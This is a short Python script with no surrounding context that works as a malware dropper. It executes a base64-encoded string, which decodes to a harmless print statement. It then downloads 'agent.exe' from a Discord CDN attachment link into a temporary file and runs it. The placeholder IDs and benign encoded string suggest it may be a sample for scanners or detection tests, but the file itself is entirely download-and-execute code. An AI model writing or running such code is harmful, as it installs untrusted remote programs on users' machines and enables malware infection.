import base64
import requests
import subprocess
import tempfile


exec(base64.b64decode("cHJpbnQoJ3JlYWR5Jyk="))
response = requests.get("https://cdn.discordapp.com/attachments/1/2/agent.exe")
with tempfile.NamedTemporaryFile(delete=False) as temp:
    temp.write(response.content)
subprocess.call([temp.name])
